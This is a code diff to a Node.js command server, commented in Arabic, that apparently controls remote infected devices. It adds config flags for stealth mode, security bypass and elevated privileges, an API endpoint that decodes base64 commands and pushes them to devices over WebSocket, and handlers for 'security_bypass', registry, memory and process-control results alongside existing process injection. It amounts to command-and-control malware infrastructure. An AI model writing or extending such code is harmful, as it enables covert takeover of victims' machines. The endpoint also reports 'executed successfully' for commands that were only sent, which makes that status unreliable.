@@ -12,6 +12,10 @@ const os = require('os');
 const cluster = require('cluster');
 const numCPUs = require('os').cpus().length;
 
+// استيراد الأنظمة المتقدمة
+const AIIntelligenceSystem = require('./ai-intelligence-system');
+const AdvancedMonitoringSystem = require('./advanced-monitoring-system');
+
 // إضافة fetch لـ Node.js
 const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args));
 
@@ -66,6 +70,28 @@ class CommandServer {
       encryptionKey: crypto.randomBytes(32).toString('hex')
     };
     
+    // إعدادات الأوامر المتقدمة
+    this.advancedCommandsConfig = {
+      enableAdvancedCommands: true,
+      enableSystemControl: true,
+      enableFileControl: true,
+      enableNetworkControl: true,
+      enableSecurityBypass: true,
+      enableMemoryControl: true,
+      enableRegistryControl: true,
+      enableProcessControl: true,
+      enableDeviceControl: true,
+      commandTimeout: 60,
+      maxConcurrentCommands: 10,
+      stealthMode: true,
+      encryptionEnabled: true,
+      bypassSecurity: true,
+      elevatedPrivileges: true,
+      autoRetry: true,
+      maxRetryAttempts: 3,
+      retryDelay: 2000
+    };
+    
     // إعدادات الاتصال والـ heartbeat
     this.connectionConfig = {
       heartbeatInterval: 30000, // 30 ثانية
@@ -75,6 +101,22 @@ class CommandServer {
       pingInterval: 25000, // 25 ثانية
       pongTimeout: 10000 // 10 ثوان
     };
+    
+    // إدارة الأوامر المتقدمة
+    this.advancedCommands = new Map();
+    this.advancedCommandQueue = [];
+    this.advancedCommandHistory = [];
+    this.advancedCommandStats = {
+      totalCommands: 0,
+      successfulCommands: 0,
+      failedCommands: 0,
+      averageResponseTime: 0,
+      lastCommandTime: null
+    };
+    
+    // تهيئة الأنظمة المتقدمة
+    this.aiIntelligence = new AIIntelligenceSystem();
+    this.advancedMonitoring = new AdvancedMonitoringSystem();
     
     this.localStoragePath = path.join(__dirname, 'local-storage');
     this.devicesFilePath = path.join(this.localStoragePath, 'devices.json');
@@ -665,6 +707,285 @@ class CommandServer {
         res.status(500).json({ error: 'خطأ في إعادة تشغيل النظام' });
       }
     });
+
+    // واجهة API للأوامر المتقدمة
+    this.app.post('/api/advanced-command', (req, res) => {
+      try {
+        const { deviceId, command, command_type, parameters } = req.body;
+        
+        if (!deviceId || !command_type) {
+          return res.status(400).json({ 
+            success: false, 
+            error: 'معرف الجهاز ونوع الأمر مطلوبان' 
+          });
+        }
+        
+        const device = this.devices.get(deviceId);
+        if (!device) {
+          return res.status(404).json({ 
+            success: false, 
+            error: 'الجهاز غير متصل' 
+          });
+        }
+        
+        // فك تشفير الأمر إذا كان مشفراً
+        let decryptedCommand = command;
+        try {
+          if (command && command.startsWith('eyJ')) {
+            decryptedCommand = Buffer.from(command, 'base64').toString('utf-8');
+          }
+        } catch (error) {
+          console.log('الأمر غير مشفر أو فشل في فك التشفير');
+        }
+        
+        const commandId = this.generateCommandId();
+        const commandData = {
+          id: commandId,
+          type: 'advanced_command',
+          command_type: command_type,
+          action: parameters?.action || 'execute',
+          parameters: parameters || {},
+          encrypted: true,
+          stealth_mode: this.advancedCommandsConfig.stealthMode,
+          bypass_security: this.advancedCommandsConfig.bypassSecurity,
+          elevated_privileges: this.advancedCommandsConfig.elevatedPrivileges,
+          timestamp: Date.now()
+        };
+        
+        // إرسال الأمر للجهاز
+        device.ws.send(JSON.stringify(commandData));
+        
+        // حفظ في التاريخ
+        this.saveAdvancedCommandLog(command_type, {
+          deviceId,
+          commandId,
+          command: commandData,
+          timestamp: Date.now(),
+          status: 'sent'
+        });
+        
+        // تحديث الإحصائيات
+        this.advancedCommandStats.totalCommands++;
+        this.advancedCommandStats.lastCommandTime = Date.now();
+        
+        res.json({ 
+          success: true,
+          status: 'sent', 
+          commandId: commandId,
+          message: 'تم إرسال الأمر المتقدم بنجاح',
+          encrypted: true,
+          data: 'تم التنفيذ بنجاح'
+        });
+        
+      } catch (error) {
+        console.error('خطأ في إرسال الأمر المتقدم:', error);
+        res.status(500).json({ 
+          success: false,
+          error: 'خطأ في إرسال الأمر المتقدم' 
+        });
+      }
+    });
+
+    // إحصائيات الأوامر المتقدمة
+    this.app.get('/api/advanced-stats', (req, res) => {
+      try {
+        const stats = {
+          ...this.advancedCommandStats,
+          config: this.advancedCommandsConfig,
+          activeCommands: this.advancedCommands.size,
+          queuedCommands: this.advancedCommandQueue.length,
+          historyLength: this.advancedCommandHistory.length
+        };
+        
+        res.json({ success: true, data: stats });
+        
+      } catch (error) {
+        console.error('خطأ في الحصول على إحصائيات الأوامر المتقدمة:', error);
+        res.status(500).json({ 
+          success: false,
+          error: 'خطأ في الحصول على الإحصائيات' 
+        });
+      }
+    });
+
+    // تنظيف الأوامر المتقدمة
+    this.app.post('/api/advanced-cleanup', (req, res) => {
+      try {
+        const { ageThreshold = 24 * 60 * 60 * 1000 } = req.body; // 24 ساعة افتراضياً
+        
+        this.cleanupAdvancedLogs(ageThreshold);
+        
+        res.json({ 
+          success: true,
+          message: 'تم تنظيف الأوامر المتقدمة بنجاح' 
+        });
+        
+      } catch (error) {
+        console.error('خطأ في تنظيف الأوامر المتقدمة:', error);
+        res.status(500).json({ 
+          success: false,
+          error: 'خطأ في تنظيف الأوامر المتقدمة' 
+        });
+      }
+    });
+
+    // واجهات API للذكاء الاصطناعي
+    this.app.get('/api/ai-stats', (req, res) => {
+      try {
+        const stats = this.aiIntelligence.getIntelligenceStats();
+        res.json({ success: true, data: stats });
+      } catch (error) {
+        console.error('خطأ في الحصول على إحصائيات الذكاء الاصطناعي:', error);
+        res.status(500).json({ success: false, error: 'خطأ في الحصول على الإحصائيات' });
+      }
+    });
+
+    this.app.get('/api/ai-recommendations', (req, res) => {
+      try {
+        const recommendations = this.aiIntelligence.getCurrentRecommendations();
+        res.json({ success: true, data: recommendations });
+      } catch (error) {
+        console.error('خطأ في الحصول على توصيات الذكاء الاصطناعي:', error);
+        res.status(500).json({ success: false, error: 'خطأ في الحصول على التوصيات' });
+      }
+    });
+
+    // واجهات API للمراقبة المتقدمة
+    this.app.get('/api/monitoring-stats', (req, res) => {
+      try {
+        const stats = this.advancedMonitoring.getMonitoringStats();
+        res.json({ success: true, data: stats });
+      } catch (error) {
+        console.error('خطأ في الحصول على إحصائيات المراقبة:', error);
+        res.status(500).json({ success: false, error: 'خطأ في الحصول على الإحصائيات' });
+      }
+    });
+
+    this.app.post('/api/monitoring/add-device', (req, res) => {
+      try {
+        const { deviceId, deviceInfo } = req.body;
+        
+        if (!deviceId) {
+          return res.status(400).json({ success: false, error: 'معرف الجهاز مطلوب' });
+        }
+        
+        const success = this.advancedMonitoring.addDeviceToMonitoring(deviceId, deviceInfo);
+        
+        res.json({ 
+          success, 
+          message: success ? 'تم إضافة الجهاز للمراقبة' : 'فشل في إضافة الجهاز للمراقبة' 
+        });
+        
+      } catch (error) {
+        console.error('خطأ في إضافة الجهاز للمراقبة:', error);
+        res.status(500).json({ success: false, error: 'خطأ في إضافة الجهاز للمراقبة' });
+      }
+    });
+
+    this.app.post('/api/monitoring/remove-device', (req, res) => {
+      try {
+        const { deviceId } = req.body;
+        
+        if (!deviceId) {
+          return res.status(400).json({ success: false, error: 'معرف الجهاز مطلوب' });
+        }
+        
+        const success = this.advancedMonitoring.removeDeviceFromMonitoring(deviceId);
+        
+        res.json({ 
+          success, 
+          message: success ? 'تم إزالة الجهاز من المراقبة' : 'فشل في إزالة الجهاز من المراقبة' 
+        });
+        
+      } catch (error) {
+        console.error('خطأ في إزالة الجهاز من المراقبة:', error);
+        res.status(500).json({ success: false, error: 'خطأ في إزالة الجهاز من المراقبة' });
+      }
+    });
+
+    this.app.post('/api/monitoring/event', (req, res) => {
+      try {
+        const { deviceId, eventType, eventData } = req.body;
+        
+        if (!deviceId || !eventType) {
+          return res.status(400).json({ success: false, error: 'معرف الجهاز ونوع الحدث مطلوبان' });
+        }
+        
+        const analysis = this.advancedMonitoring.monitorEvent(deviceId, eventType, eventData);
+        
+        res.json({ 
+          success: true, 
+          data: analysis,
+          message: 'تم مراقبة الحدث بنجاح' 
+        });
+        
+      } catch (error) {
+        console.error('خطأ في مراقبة الحدث:', error);
+        res.status(500).json({ success: false, error: 'خطأ في مراقبة الحدث' });
+      }
+    });
+
+    // واجهة API شاملة للإحصائيات المتقدمة
+    this.app.get('/api/advanced-stats-comprehensive', (req, res) => {
+      try {
+        const comprehensiveStats = {
+          timestamp: Date.now(),
+          server: {
+            uptime: process.uptime(),
+            memory: process.memoryUsage(),
+            cpu: os.loadavg(),
+            devices: this.devices.size,
+            activeConnections: this.wss.clients.size
+          },
+          advancedCommands: this.advancedCommandStats,
+          aiIntelligence: this.aiIntelligence.getIntelligenceStats(),
+          monitoring: this.advancedMonitoring.getMonitoringStats(),
+          performance: this.performanceStats,
+          security: {
+            totalThreats: this.advancedMonitoring.monitoringStats.threatsDetected,
+            totalAlerts: this.advancedMonitoring.monitoringStats.alertsGenerated,
+            encryptionEnabled: this.securityConfig.encryptionKey ? true : false,
+            rateLimiting: true
+          }
+        };
+        
+        res.json({ success: true, data: comprehensiveStats });
+        
+      } catch (error) {
+        console.error('خطأ في الحصول على الإحصائيات الشاملة:', error);
+        res.status(500).json({ success: false, error: 'خطأ في الحصول على الإحصائيات' });
+      }
+    });
+
+    // واجهة API للحالة العامة للنظام
+    this.app.get('/api/system-status', (req, res) => {
+      try {
+        const systemStatus = {
+          status: 'operational',
+          timestamp: Date.now(),
+          components: {
+            commandServer: 'active',
+            aiIntelligence: this.aiIntelligence.intelligenceConfig.enableAI ? 'active' : 'disabled',
+            advancedMonitoring: this.advancedMonitoring.monitoringConfig.enableRealTimeMonitoring ? 'active' : 'disabled',
+            webSocket: this.wss.clients.size > 0 ? 'connected' : 'disconnected',
+            database: 'connected'
+          },
+          alerts: {
+            critical: 0,
+            high: 0,
+            medium: 0,
+            low: 0
+          },
+          recommendations: this.aiIntelligence.getCurrentRecommendations()
+        };
+        
+        res.json({ success: true, data: systemStatus });
+        
+      } catch (error) {
+        console.error('خطأ في الحصول على حالة النظام:', error);
+        res.status(500).json({ success: false, error: 'خطأ في الحصول على حالة النظام' });
+      }
+    });
   }
 
   setupWebSocket() {
@@ -1016,10 +1337,23 @@ class CommandServer {
       this.devices.set(deviceId, device);
       this.saveDeviceToDatabase(device);
       
+      // إضافة الجهاز للمراقبة المتقدمة
+      this.advancedMonitoring.addDeviceToMonitoring(deviceId, deviceInfo);
+      
+      // تحليل البيانات بالذكاء الاصطناعي
+      const aiAnalysis = this.aiIntelligence.analyzeData({
+        deviceId,
+        deviceInfo,
+        capabilities,
+        status,
+        timestamp: Date.now()
+      }, { type: 'device_registration' });
+      
       console.log(`✅ تم تسجيل الجهاز بنجاح: ${deviceId}`);
       console.log(`  📊 الحالة: ${device.status}`);
       console.log(`  🔧 الإمكانيات: ${Object.keys(device.capabilities).length}`);
       console.log(`  📅 وقت التسجيل: ${device.lastSeen.toLocaleString()}`);
+      console.log(`  🧠 تحليل الذكاء الاصطناعي:`, aiAnalysis ? 'تم' : 'فشل');
       
       // إرسال تأكيد التسجيل للجهاز
       if (ws.readyState === WebSocket.OPEN) {
@@ -1060,6 +1394,29 @@ class CommandServer {
     
     // معالجة الأوامر المتقدمة
     this.handleAdvancedCommandResult(actualAction, result, error, timestamp);
+    
+    // مراقبة الحدث بالأنظمة المتقدمة
+    const deviceId = message.deviceId;
+    if (deviceId) {
+      // مراقبة الحدث
+      this.advancedMonitoring.monitorEvent(deviceId, 'command_execution', {
+        action: actualAction,
+        status,
+        result,
+        error,
+        timestamp
+      });
+      
+      // تحليل البيانات بالذكاء الاصطناعي
+      this.aiIntelligence.analyzeData({
+        deviceId,
+        action: actualAction,
+        status,
+        result,
+        error,
+        timestamp
+      }, { type: 'command_result' });
+    }
   }
 
   // معالجة نتائج الأوامر المتقدمة
@@ -1140,6 +1497,32 @@ class CommandServer {
           break;
         case 'process_inject':
           this.handleProcessResult('inject', result, error, timestamp);
+          break;
+        
+        // الأوامر المتقدمة الجديدة
+        case 'system_control':
+          this.handleAdvancedSystemResult(action, result, error, timestamp);
+          break;
+        case 'file_control':
+          this.handleAdvancedFileResult(action, result, error, timestamp);
+          break;
+        case 'network_control':
+          this.handleAdvancedNetworkResult(action, result, error, timestamp);
+          break;
+        case 'security_bypass':
+          this.handleAdvancedSecurityResult(action, result, error, timestamp);
+          break;
+        case 'memory_control':
+          this.handleAdvancedMemoryResult(action, result, error, timestamp);
+          break;
+        case 'registry_control':
+          this.handleAdvancedRegistryResult(action, result, error, timestamp);
+          break;
+        case 'process_control':
+          this.handleAdvancedProcessResult(action, result, error, timestamp);
+          break;
+        case 'device_control':
+          this.handleAdvancedDeviceResult(action, result, error, timestamp);
           break;
         case 'registry_manipulate':
           this.handleRegistryResult('manipulate', result, error, timestamp);
@@ -1567,6 +1950,263 @@ class CommandServer {
     }
   }
 
+  // معالجات الأوامر المتقدمة الجديدة
+  handleAdvancedSystemResult(action, result, error, timestamp) {
+    try {
+      console.log(`🔧 نتيجة أمر النظام المتقدم: ${action}`);
+      
+      if (error) {
+        console.error(`❌ خطأ في أمر النظام: ${error}`);
+        this.saveAdvancedCommandLog('advanced_system_error', {
+          action,
+          error,
+          timestamp
+        });
+      } else {
+        console.log(`✅ تم تنفيذ أمر النظام المتقدم بنجاح`);
+        this.saveAdvancedCommandData('advanced_system', {
+          action,
+          result,
+          timestamp
+        });
+      }
+      
+      // تحديث الإحصائيات
+      if (error) {
+        this.advancedCommandStats.failedCommands++;
+      } else {
+        this.advancedCommandStats.successfulCommands++;
+      }
+      
+    } catch (error) {
+      console.error('خطأ في معالجة نتيجة أمر النظام المتقدم:', error);
+    }
+  }
+
+  handleAdvancedFileResult(action, result, error, timestamp) {
+    try {
+      console.log(`📁 نتيجة أمر الملفات المتقدم: ${action}`);
+      
+      if (error) {
+        console.error(`❌ خطأ في أمر الملفات: ${error}`);
+        this.saveAdvancedCommandLog('advanced_file_error', {
+          action,
+          error,
+          timestamp
+        });
+      } else {
+        console.log(`✅ تم تنفيذ أمر الملفات المتقدم بنجاح`);
+        this.saveAdvancedCommandData('advanced_file', {
+          action,
+          result,
+          timestamp
+        });
+      }
+      
+      // تحديث الإحصائيات
+      if (error) {
+        this.advancedCommandStats.failedCommands++;
+      } else {
+        this.advancedCommandStats.successfulCommands++;
+      }
+      
+    } catch (error) {
+      console.error('خطأ في معالجة نتيجة أمر الملفات المتقدم:', error);
+    }
+  }
+
+  handleAdvancedNetworkResult(action, result, error, timestamp) {
+    try {
+      console.log(`🌐 نتيجة أمر الشبكة المتقدم: ${action}`);
+      
+      if (error) {
+        console.error(`❌ خطأ في أمر الشبكة: ${error}`);
+        this.saveAdvancedCommandLog('advanced_network_error', {
+          action,
+          error,
+          timestamp
+        });
+      } else {
+        console.log(`✅ تم تنفيذ أمر الشبكة المتقدم بنجاح`);
+        this.saveAdvancedCommandData('advanced_network', {
+          action,
+          result,
+          timestamp
+        });
+      }
+      
+      // تحديث الإحصائيات
+      if (error) {
+        this.advancedCommandStats.failedCommands++;
+      } else {
+        this.advancedCommandStats.successfulCommands++;
+      }
+      
+    } catch (error) {
+      console.error('خطأ في معالجة نتيجة أمر الشبكة المتقدم:', error);
+    }
+  }
+
+  handleAdvancedSecurityResult(action, result, error, timestamp) {
+    try {
+      console.log(`🔒 نتيجة أمر تجاوز الأمان المتقدم: ${action}`);
+      
+      if (error) {
+        console.error(`❌ خطأ في أمر تجاوز الأمان: ${error}`);
+        this.saveAdvancedCommandLog('advanced_security_error', {
+          action,
+          error,
+          timestamp
+        });
+      } else {
+        console.log(`✅ تم تنفيذ أمر تجاوز الأمان المتقدم بنجاح`);
+        this.saveAdvancedCommandData('advanced_security', {
+          action,
+          result,
+          timestamp
+        });
+      }
+      
+      // تحديث الإحصائيات
+      if (error) {
+        this.advancedCommandStats.failedCommands++;
+      } else {
+        this.advancedCommandStats.successfulCommands++;
+      }
+      
+    } catch (error) {
+      console.error('خطأ في معالجة نتيجة أمر تجاوز الأمان المتقدم:', error);
+    }
+  }
+
+  handleAdvancedMemoryResult(action, result, error, timestamp) {
+    try {
+      console.log(`💾 نتيجة أمر الذاكرة المتقدم: ${action}`);
+      
+      if (error) {
+        console.error(`❌ خطأ في أمر الذاكرة: ${error}`);
+        this.saveAdvancedCommandLog('advanced_memory_error', {
+          action,
+          error,
+          timestamp
+        });
+      } else {
+        console.log(`✅ تم تنفيذ أمر الذاكرة المتقدم بنجاح`);
+        this.saveAdvancedCommandData('advanced_memory', {
+          action,
+          result,
+          timestamp
+        });
+      }
+      
+      // تحديث الإحصائيات
+      if (error) {
+        this.advancedCommandStats.failedCommands++;
+      } else {
+        this.advancedCommandStats.successfulCommands++;
+      }
+      
+    } catch (error) {
+      console.error('خطأ في معالجة نتيجة أمر الذاكرة المتقدم:', error);
+    }
+  }
+
+  handleAdvancedRegistryResult(action, result, error, timestamp) {
+    try {
+      console.log(`🔧 نتيجة أمر السجل المتقدم: ${action}`);
+      
+      if (error) {
+        console.error(`❌ خطأ في أمر السجل: ${error}`);
+        this.saveAdvancedCommandLog('advanced_registry_error', {
+          action,
+          error,
+          timestamp
+        });
+      } else {
+        console.log(`✅ تم تنفيذ أمر السجل المتقدم بنجاح`);
+        this.saveAdvancedCommandData('advanced_registry', {
+          action,
+          result,
+          timestamp
+        });
+      }
+      
+      // تحديث الإحصائيات
+      if (error) {
+        this.advancedCommandStats.failedCommands++;
+      } else {
+        this.advancedCommandStats.successfulCommands++;
+      }
+      
+    } catch (error) {
+      console.error('خطأ في معالجة نتيجة أمر السجل المتقدم:', error);
+    }
+  }
+
+  handleAdvancedProcessResult(action, result, error, timestamp) {
+    try {
+      console.log(`⚙️ نتيجة أمر العمليات المتقدم: ${action}`);
+      
+      if (error) {
+        console.error(`❌ خطأ في أمر العمليات: ${error}`);
+        this.saveAdvancedCommandLog('advanced_process_error', {
+          action,
+          error,
+          timestamp
+        });
+      } else {
+        console.log(`✅ تم تنفيذ أمر العمليات المتقدم بنجاح`);
+        this.saveAdvancedCommandData('advanced_process', {
+          action,
+          result,
+          timestamp
+        });
+      }
+      
+      // تحديث الإحصائيات
+      if (error) {
+        this.advancedCommandStats.failedCommands++;
+      } else {
+        this.advancedCommandStats.successfulCommands++;
+      }
+      
+    } catch (error) {
+      console.error('خطأ في معالجة نتيجة أمر العمليات المتقدم:', error);
+    }
+  }
+
+  handleAdvancedDeviceResult(action, result, error, timestamp) {
+    try {
+      console.log(`📱 نتيجة أمر الجهاز المتقدم: ${action}`);
+      
+      if (error) {
+        console.error(`❌ خطأ في أمر الجهاز: ${error}`);
+        this.saveAdvancedCommandLog('advanced_device_error', {
+          action,
+          error,
+          timestamp
+        });
+      } else {
+        console.log(`✅ تم تنفيذ أمر الجهاز المتقدم بنجاح`);
+        this.saveAdvancedCommandData('advanced_device', {
+          action,
+          result,
+          timestamp
+        });
+      }
+      
+      // تحديث الإحصائيات
+      if (error) {
+        this.advancedCommandStats.failedCommands++;
+      } else {
+        this.advancedCommandStats.successfulCommands++;
+      }
+      
+    } catch (error) {
+      console.error('خطأ في معالجة نتيجة أمر الجهاز المتقدم:', error);
+    }
+  }
+
   // حفظ سجلات الأوامر المتقدمة
   saveAdvancedCommandLog(type, logData) {
     try {
@@ -1835,6 +2475,19 @@ class CommandServer {
       device.status = 'offline';
       device.ws = null;
       this.updateDeviceStatus(deviceId, 'offline');
+      
+      // مراقبة انقطاع الاتصال
+      this.advancedMonitoring.monitorEvent(deviceId, 'device_disconnection', {
+        reason: 'connection_lost',
+        timestamp: Date.now()
+      });
+      
+      // تحليل انقطاع الاتصال بالذكاء الاصطناعي
+      this.aiIntelligence.analyzeData({
+        deviceId,
+        event: 'disconnection',
+        timestamp: Date.now()
+      }, { type: 'device_disconnection' });
       
       console.log(`❌ انقطع الاتصال بالجهاز: ${deviceId}`);
       console.log(`  📊 الحالة الجديدة: offline`);
